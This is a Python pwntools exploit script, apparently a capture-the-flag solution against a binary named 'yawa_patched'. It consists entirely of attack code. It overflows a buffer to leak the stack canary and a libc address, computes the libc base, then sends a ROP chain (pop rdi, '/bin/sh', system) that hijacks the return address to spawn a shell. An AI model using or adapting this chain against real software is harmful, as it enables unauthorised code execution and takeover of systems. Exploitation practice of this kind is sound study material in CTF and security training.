#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./yawa_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


b*main+142
c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

# [1] Leak canary
buf2cnry = b'A' * 0x59

sla(b'> ', b'1')
s(buf2cnry)
sla(b'> ', b'2')
ru(buf2cnry)
cnry = u64(b'\x00' + rnb(7))
slog('Canary', cnry)

# [2] Leak libc

pl1 = b'B' * 0x58 + b'C' * 0x8 + b'D' * 0x8
sla(b'> ', b'1')
s(pl1)
sla(b'> ', b'2')
ru(pl1)
libc_start_main = u64(rnb(6) + b'\x00\x00')
libc.address = libc_start_main - 0x1d90 - 0x28000
slog('libc_start_main', libc_start_main)
slog('libc base',libc.address)
slog('system', libc.sym.system)
slog('/bin/sh',next(libc.search(b'/bin/sh')))

# [3] Get shell
 
pop_rdi = 0x000000000002a3e5
ret = 0x0000000000029139

pl2 = b'A' * 0x58 + p64(cnry) + b'B' * 0x8
pl2 += p64(ret + libc.address)
pl2 += p64(pop_rdi + libc.address) + p64(next(libc.search(b'/bin/sh')))
pl2 += p64(libc.sym.system)
sla(b'> ',b'1')
s(pl2)
sla(b'> ',b'3')

interactive()
